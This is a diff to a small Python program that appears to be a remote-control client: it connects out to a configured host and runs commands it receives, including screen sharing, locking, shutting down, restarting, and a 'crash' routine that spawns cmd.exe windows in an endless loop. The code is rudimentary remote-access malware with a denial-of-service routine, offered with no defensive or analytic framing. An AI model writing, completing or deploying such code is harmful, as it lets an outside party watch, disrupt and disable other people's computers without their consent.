@@ -19,41 +19,41 @@ try:
 except:
     print("nope")
 
+def main():
+    while (keepgoing == True):
+        try:
+            sockk = connnect()
+            while keepgoing == True:
+                msg = recv(sockk)
+                if msg == "exit":
+                    exit()
+                elif msg == "username":
+                    username(sockk)
+                elif msg == "screenshare":
+                    screenshare()
+                elif msg == "website":
+                    website(sockk)
+                elif msg == "crash":
+                    crash()
+                elif msg == "shutdown":
+                    shutdown()
+                elif msg == "lock":
+                    lock()
+                elif msg == "restart":
+                    restart()
 
-while (keepgoing == True):
-    try:
-        sock = connect()
-        while keepgoing == True:
-            msg = recv()
-            if msg == "exit":
-                exit()
-            elif msg == "username":
-                username(sock)
-            elif msg == "screenshare":
-                screenshare()
-            elif msg == "website":
-                website(sock)
-            elif msg == "crash":
-                crash()
-            elif msg == "shutdown":
-                shutdown()
-            elif msg == "lock":
-                lock()
-            elif msg == "restart":
-                restart()
+        except:
+            traceback.print_exc()
+            continue
 
-    except:
-        traceback.print_exc()
-        continue
-
-def connect():
+def connnect():
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     address = (ip,port)
     sock.connect(address)
     return sock
 
 
-def recv():
+def recv(sock):
     msg = sock.recv(1024)
     msg = msg.decode()
     return msg
@@ -86,7 +86,6 @@ def website(sock):
 def crash():
     while True:
         os.system("start /B start cmd.exe")
-        print("started")
 
 
 def shutdown():
@@ -99,3 +98,5 @@ def lock():
 
 def restart():
     os.system("shutdown /s /r 1")
+
+main()
